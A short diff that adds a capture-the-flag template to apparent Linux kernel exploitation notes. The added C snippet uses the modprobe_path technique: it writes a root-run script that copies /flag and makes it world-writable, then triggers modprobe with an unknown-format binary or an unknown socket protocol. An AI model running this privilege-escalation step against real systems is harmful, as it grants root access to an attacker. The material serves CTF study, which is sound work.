@@ -94,3 +94,21 @@ kernel_modprobe_create_fake_modprobe("/tmp/x", "/tmp/err", true);
 // system("/tmp/err");
 // system("/tmp/x");
 ```
+
+## ctf wiki模板
+
+```C
+// step 1. modify modprobe_path to the target value
+
+// step 2. create related file
+system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag' > /home/pwn/catflag.sh");
+system("chmod +x /home/pwn/catflag.sh");
+
+// step 3. trigger modprobe using unknown executable (may be obsolete)
+system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
+system("chmod +x /home/pwn/dummy");
+system("/home/pwn/dummy");
+
+// step 3. trigger modprobe using unknown protocol
+socket(AF_INET,SOCK_STREAM,132);
+```
